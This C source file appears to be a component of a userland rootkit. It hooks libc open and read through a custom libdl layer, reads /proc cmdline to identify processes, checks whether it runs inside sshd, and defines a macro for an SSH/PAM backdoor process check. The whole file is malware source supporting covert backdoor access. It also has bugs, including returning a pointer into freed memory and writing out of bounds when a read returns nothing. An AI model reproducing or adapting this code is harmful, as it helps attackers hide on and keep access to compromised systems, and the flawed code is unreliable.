#include "../hooks/libdl/libdl.h"

/* gets the path of pid's cmdline file & opens it
 * for reading. returns the resulting fd. */
int open_cmdline(pid_t pid){
    char path[PROCPATH_MAXLEN];
    int fd;
    snprintf(path, sizeof(path), CMDLINE_PATH, pid);
    hook(COPEN);
    fd = (long)call(COPEN, path, 0, 0);
    return fd;
}

// mode = MODE_NAME || MODE_CMDLINE
char *process_info(pid_t pid, int mode){
    char *process_info;
    int fd, c;

    hook(CREAD);

    fd = open_cmdline(pid);
    if(fd < 0){
        process_info = FALLBACK_PROCNAME;
        goto end_processinfo;
    }

    switch(mode){
        case MODE_NAME:
            process_info = malloc(NAME_MAXLEN+1);
            memset(process_info, 0, NAME_MAXLEN+1);
            c = (long)call(CREAD, fd, process_info, NAME_MAXLEN);
            break;
        case MODE_CMDLINE:
            process_info = malloc(CMDLINE_MAXLEN+1);
            memset(process_info, 0, CMDLINE_MAXLEN+1);
            c = (long)call(CREAD, fd, process_info, CMDLINE_MAXLEN);
            for(int i = 0; i < c; i++)
                if(process_info[i] == 0x00)
                    process_info[i] = 0x20;
            process_info[c-1]='\0';
            break;
    }

    close(fd);
end_processinfo:
    return process_info;
}

int sshdproc(void){
    int sshd=0;
    char *myname = process_name();
    if(!fnmatch("*/sshd", myname, FNM_PATHNAME))
        sshd=1;
    free(myname);
    return sshd;
}

// these functions use macros..
int cmp_process(char *name){
    char *myname = process_name();
    int status = strncmp(myname, name, strlen(myname));
    free(myname);
    return !status;
}
char *str_process(char *name){
    char *myname = process_name(),
         *status = strstr(myname, name);
    free(myname);
    return status;
}
int process(char *name){
    if(cmp_process(name)) return 1;
    if(str_process(name)) return 1;
    return 0;
}

#ifdef USE_PAM_BD
#define bd_sshproc() process(BD_SSHPROCNAME)
#endif